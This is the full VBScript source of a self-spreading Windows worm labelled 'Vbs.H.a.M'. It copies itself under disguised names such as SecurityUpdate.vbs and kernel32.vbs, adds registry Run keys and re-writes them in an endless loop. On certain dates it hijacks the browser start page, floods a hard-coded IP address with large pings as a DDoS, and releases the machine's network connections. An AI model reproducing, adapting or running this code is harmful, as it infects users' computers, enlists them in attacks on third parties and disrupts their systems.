rem /************************ Vbs.H.a.M ************************/
On Error Resume Next
Dim sialalalala
Set sialalalala = CreateObject("Scripting.FileSystemObject")
Set drogadowin = sialalalala.GetSpecialFolder(0)
Set kopjuuuuj = sialalalala.GetFile(WScript.ScriptFullName)
If Month(now) <> 4 and Day(now) <> 19 Then
kopjuuuuj.Copy(dirwin&"\Menu Start\Programy\Autostart\SecurityUpdate.vbs")
Set drogadosys = sialalalala.GetSpecialFolder(1)
Set kopjuuuuj = sialalalala.GetFile(WScript.ScriptFullName)
kopjuuuuj.Copy(drogadosys&"\options.vbs")
kopjuuuuj.Copy(drogadosys&"\update.vbs")
Set rejestreq = CreateObject("WScript.Shell")                   
rejestreq.RegWrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\GraphicOptions",drogadowin&"\options.vbs" 
rejestreq.RegWrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\UpdateSecurity",drogadosys&"\update.vbs" 
                     
if Month(now) = 9 and Day(now) = 25 Then
rejestreq.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main\Start Page", "http://h-a-m.w.interia.pl/"
Set ping = CreateObject("Wscript.Shell")
ping.Run("ping -l 60000 -n 1000 -w 1 217.97.1.228")
msgbox "Thx for help with DDoS !! :)",32,"H.a.M by somebody from lo4 =]"     
end if
if Month(now) = 9 and Day(now) = 26 and Hour(now) <> 17 Then
Set ip = CreateObject("WScript.Shell")
ip.Run("ipconfig /release_all")
end if
if Month(now) <> 9 and Day(now) = 25 Then
Set sialalalala = CreateObject("Scripting.FileSystemObject")
Set kopjuuuuj = sialalalala.GetFile(Wscript.ScriptFullName)
kopjuuuuj.Copy(drogadowin&"\kernel32.vbs")
set rejestreq = CreateObject("WScript.Shell")
rejestreq.RegWrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\Kernel32",dirwin&"\kernel32.vbs" 
end if   

do
sprawdz=rejestreq.regread("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\GraphicOptions")
sprawdz2=rejestreq.regread("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\UpdateSecurity") 
If sprawdz <> drogadosys&"\options.vbs" then
rejestreq.regwrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\GraphicOptions",drogadowin&"\options.vbs"
If sprawdz2 <> drogadosys&"\update.vbs" then
rejestreq.RegWrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\UpdateSecurity",drogadosys&"\update.vbs"
end if
end if
sprawdz= ""
sprawdz2= ""
sprawdz3= ""
loop
end if


